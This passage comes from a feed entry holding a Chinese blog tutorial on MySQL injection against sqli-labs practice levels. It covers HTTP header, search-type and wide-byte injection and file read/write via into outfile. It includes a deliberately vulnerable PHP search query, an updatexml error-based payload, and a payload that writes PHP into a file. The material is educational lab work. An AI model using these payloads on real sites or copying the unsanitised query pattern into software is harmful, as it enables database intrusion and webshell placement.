class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">insert into users(id,username,passowrd) values (2,&#39;&#39;1&#39;&#39;,&#39;Da4er);</span><br><span class="line"></span><br><span class="line">UPDATE 表名称 SET 列名称 &#x3D; 新值 WHERE 列名称 &#x3D; 某值</span><br><span class="line"></span><br><span class="line">DELETE FROM 表名称 WHERE 列名称 &#x3D; 值</span><br></pre></td></tr></table></figure><br>这类的注入不在给出例子 ，向这三个类型的注入更多的是配合报错提示进行注入<br>参考文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;babers&#x2F;articles&#x2F;7252401.html</span><br></pre></td></tr></table></figure><br>这个可以做一下sqli-labs第十七关的update注入</p><h2 id="七-http头注入"><a href="#七-http头注入" class="headerlink" title="七.http头注入"></a>七.http头注入</h2><p>http头注入本质还是注入位置的不同<br>在有些应用中http头的信息会回显到浏览器，这个时候可以尝试一下http头注入，注入利用的方式和get类型的一样<br>我们来以sqli-labs第18关注入user-agent头为例：<br>配合报错注入来进行注入：<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image"><br></p><h2 id="八-数字型，字符型，搜索型注入"><a href="#八-数字型，字符型，搜索型注入" class="headerlink" title="八.数字型，字符型，搜索型注入"></a>八.数字型，字符型，搜索型注入</h2><p>像这三类注入，是包含上面所有的注入利用方式的，这三类注入个大方面，意思是用户输入到服务器的参数是数字，字符串，还是搜索数据的。<br>所以这三类是整个sql注入大的方面，这里不在叙述。只对搜索型注入进行分析<br>搜索型注入主要用在搜索数据时，对搜索的参数过滤不全。<br>搜索型注入的构造和其他两类不太一样，一般的要加%，这是sql里的匹配查找<br>我们来看一下一个靶场搜索型注入的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;name&#39;]!&#x3D;null)&#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里没有做任何处理，直接拼到select里面去了</span><br><span class="line">    $name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里的变量是模糊匹配，需要考虑闭合</span><br><span class="line">    $query&#x3D;&quot;select username,id,email from member where username like &#39;%$name%&#39;&quot;;</span><br><span class="line">    $result&#x3D;execute($link, $query);</span><br><span class="line">    if(mysqli_num_rows($result)&gt;&#x3D;1)&#123;</span><br><span class="line">        $html2.&#x3D;&quot;&lt;p class&#x3D;&#39;notice&#39;&gt;用户名中含有&#123;$_GET[&#39;name&#39;]&#125;的结果如下：&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        while($data&#x3D;mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            $uname&#x3D;$data[&#39;username&#39;];</span><br><span class="line">            $id&#x3D;$data[&#39;id&#39;];</span><br><span class="line">            $email&#x3D;$data[&#39;email&#39;];</span><br><span class="line">            $html1.&#x3D;&quot;&lt;p class&#x3D;&#39;notice&#39;&gt;username：&#123;$uname&#125;&lt;br &#x2F;&gt;uid:&#123;$id&#125; &lt;br &#x2F;&gt;email is: &#123;$email&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        $html1.&#x3D;&quot;&lt;p class&#x3D;&#39;notice&#39;&gt;0o。..没有搜索到你输入的信息！&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到输入的name 被’%name%’包围，这就是搜索型注入的构造方式<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image"><br>构造的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ko%&#39; and updatexml(0x7e,concat(0x7e,version(),0x7e),0x7e) or &#39;%</span><br></pre></td></tr></table></figure><br>这里只爆出数据库版本，其他的就不在这里操作了，思路都是一样，利用报错注入。</p><h2 id="九-宽字节注入"><a href="#九-宽字节注入" class="headerlink" title="九.宽字节注入"></a>九.宽字节注入</h2><p>宽字节注入是一种特殊的注入方式，其利用的思路和前面写的一样，只不过宽字节注入能绕过将单引号等特殊字符转义。<br>原因是：网站用了utf-8编码，而数据库使用了GBK编码<br>宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ \ ” 。<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节<br>mysql中用的转义函数：addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc<br>以sqli第三十三关为例：<br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image"><br><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image"><br>发现可以运用宽字节注入，绕过防御措施。<br>宽字节注入现在很少见了。<br>这里只给出了爆当前数据库名的语句，其他的注入语句和上面写的报错注入一样。宽字节注入说白了就是绕过sql防御的一种收到，因为比较经典才会单拿出来提一下。</p><h2 id="十-Mysql注入的高级利用"><a href="#十-Mysql注入的高级利用" class="headerlink" title="十.Mysql注入的高级利用"></a>十.Mysql注入的高级利用</h2><p>这部分主要是如果我们的权限足够大，可以向网站写文件或读文件<br>主要用到俩个语句：into outfile 和 load_file()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;)) UNION SELECT 1,&#39;&lt;?php echo &quot;Da4er&quot;?&gt;&#39;,3 into outfile &#39;D:\1.txt&#39; --+</span><br></pre></td></tr></table></figure><br>into outfile是向本地写文件的操作<br>load_file()是读本地文件的操作</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>明天还会在写一篇sqlmap的使用教程，然后这个学期学安全的时间到此结束了，安心准备期末了~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近一直在学sql注入的专题，准备写个文章来记录这段时间学的过程。&lt;/p&gt;
&lt;h2 id=&quot;一-有可显字段——使用常规注入法&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
